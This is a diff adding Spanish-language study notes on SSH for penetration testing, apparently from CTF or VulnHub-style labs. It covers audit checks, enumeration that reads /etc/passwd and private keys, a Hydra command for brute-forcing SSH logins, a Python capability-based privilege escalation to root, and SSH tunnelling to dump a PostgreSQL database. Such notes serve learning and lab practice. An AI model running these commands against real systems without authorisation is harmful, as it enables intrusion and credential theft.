@@ -1,0 +1,143 @@
+📖 SSH (Secure Shell) es un protocolo que permite:
+
+    > Acceder remotamente a un servidor
+    > Ejecutar comandos de forma segura
+    > Transferir archivos (SCP / SFTP)
+    > Administrar sistemas Linux/Unix
+
+    Funciona sobre TCP y cifra toda la comunicación.
+
+🔒 ¿Por qué es importante en ciberseguridad?
+
+    A diferencia del FTP (puerto 21), SSH sí cifra:
+
+        > Usuario y contraseña
+        > Comandos ejecutados
+        > Datos transmitidos
+
+    Por eso es el método estándar para administración remota segura.
+
+🚨 Riesgos en auditoría
+
+    Si el puerto 22 está abierto, se revisa:
+
+        🔑 ¿Permite login con contraseña débil?
+        👤 ¿Existe usuario root habilitado?
+        📜 ¿Versión antigua de OpenSSH?
+        🔓 ¿Permite autenticación por contraseña en vez de solo clave pública?
+
+    Además, se pueden enumerar internamente:
+
+        - Descubrir otros usuarios en el sistema:
+            	
+            Archivos como /etc/passwd o comandos como who, w, id.
+        
+        - Identificar privilegios del usuario actual:
+            
+            Usar id, groups, sudo -l, etc.
+        
+        - Buscar configuraciones sensibles de SSH:
+        
+            Leer /etc/ssh/sshd_config si tienes permisos.
+        
+        - Localizar claves privadas u otros accesos SSH:
+        
+            Archivos como ~/.ssh/id_rsa, authorized_keys.
+        
+        - Revisar procesos, conexiones de red, sockets activos y servicios activos en el sistema:
+        
+            ps aux, netstat, ss (Socket Static), lsof.
+            
+                ss -tln
+                    
+                    Muestra solo sockets activos > -l
+                    Mostrar sockets TCP > -t
+                    No intentar resolver el nombre del servicio > -n
+
+        - Detección de conexiones activas o túneles SSH:
+        
+            Posibles usos de SSH como túnel reverso o persistente.
+
+        - Buscar rutas de escalada de privilegios:
+                            
+            Permisos mal configurados, servicios vulnerables, binarios con SUID/SGID.
+
+🎯 Ejemplo de uso
+
+    ************************
+    **  ssh usuario@<IP>  **
+    ************************
+
+    También se usa para:
+
+        Túneles SSH (port forwarding)
+        Acceso a servidores cloud
+        Gestión de máquinas virtuales (como en VirtualBox o laboratorios tipo VulnHub)
+
+    En caso de que tengamos varios usuarios y una contraseña, pero no sepamos a quién corresponde, usaremos el comando: 
+
+        echo -e "root\n<name1>\n<name2>\n<name3>\n<name4>\n<name5>" > usernames.txt
+
+    para crear un fichero que contenga todos los usuarios que se conocen. Posteriormente, usa la herramienta Hydra con el siguiente comando: 
+
+        hydra -L usernames.txt -p '<Password>' <IP>  ssh -t 4
+
+    para que ejecute uno por uno los usuarios que hemos añadido en el fichero anterior.
+
+    Una vez que tengamos las credenciales del usuario, nos contectamos por ssh. 
+
+🧪 Escalada de privilegios 
+
+    ➡️ Linux
+
+        Se usa sudo -l para intentar conectarnos a root, pero no nos lo permite. Usaremos getcap, para tratar de enumerar archivos de interés. 
+
+            getcap -r / 2>/dev/null
+
+        Uno de los ficheros es python3.8. En la ruta /usr/bin buscaremos el archivo python3.8 y lo ejecutaremos. 
+
+            ./python3.8
+
+        Una vez ejecutado, introduciremos lo siguiente: 
+
+            >> import os
+            >> os.setuid(0)
+            >> os.system(“bash”)
+
+        Y ya estaremos dentro del usuario root.
+
+⚠️ Que hacer si no hay nada
+
+    En caso de que navegemos por los directorios y no encontremos nada, se puede realizar una enumeración interna. Para ello, se usa el siguiente comando: 
+
+        ss -tl
+        ss -tln
+
+    Esto verifica que puertos escuchan localmente en la máquina dada. Dependiendo del puerto que esté escuchando: 
+
+        1️⃣ PostgreSQL (5432)
+
+            Se usa el comando "psql", pero si no está instalado y no tenemos permisos de administrador, no se puede hacer nada. 
+
+            Usar tunneling para poder redirigir el tráfico de red de forma segura a través de una conexión segura. Se usarán los siguientes pasos: 
+
+                1. Conexión al usuario por ssh usando el siguiente comando: 
+
+                    ssh -L 8080:localhost:5432 <usuario>@<IP> 
+
+                        -L → Reenvío de puertos locales
+                        8080 → Puerto local 
+                        5432 → Puerto PostgreQSL
+
+                2. En otra terminal, nos conectamos a la base de datos de forma remota, a través de un túnel (hay que tener instalado psql). usamos el siguiente comando: 
+
+                        psql -U <usuario> -h localhost -p 8080
+
+                    Una vez dentro, listaremos las bases de datos a la que tiene acceso este usuario y nos conectaremos. Usaremos los siguientes comandos de psql: 
+                    
+                        \l → Listar las bases de datos
+                        \c <baseDatos> → Conectarse a una base de datos concreta
+                        \dt → Listar todas las tablas disponibles en una base de datos
+                        \d <tableName> → Listar el contenido de la tabla
+                        select value from <tableName>; → Ver el contenido de la columna
+                        \q → Salir de la conexión
